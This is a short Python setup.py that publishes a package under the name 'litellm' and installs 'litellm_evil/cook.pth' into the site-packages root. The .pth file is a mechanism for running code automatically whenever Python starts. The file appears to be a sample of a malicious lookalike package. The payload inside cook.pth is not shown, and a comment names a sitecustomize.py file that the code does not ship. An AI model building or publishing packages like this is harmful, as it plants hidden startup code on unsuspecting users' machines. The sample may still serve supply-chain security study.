from setuptools import setup, find_packages

setup(
    name="litellm",
    version="1.107.0",
    packages=find_packages(),
    # ship cook.pth and sitecustomize.py into site-packages root
    data_files=[
        ("", ["litellm_evil/cook.pth"]),
    ],
)
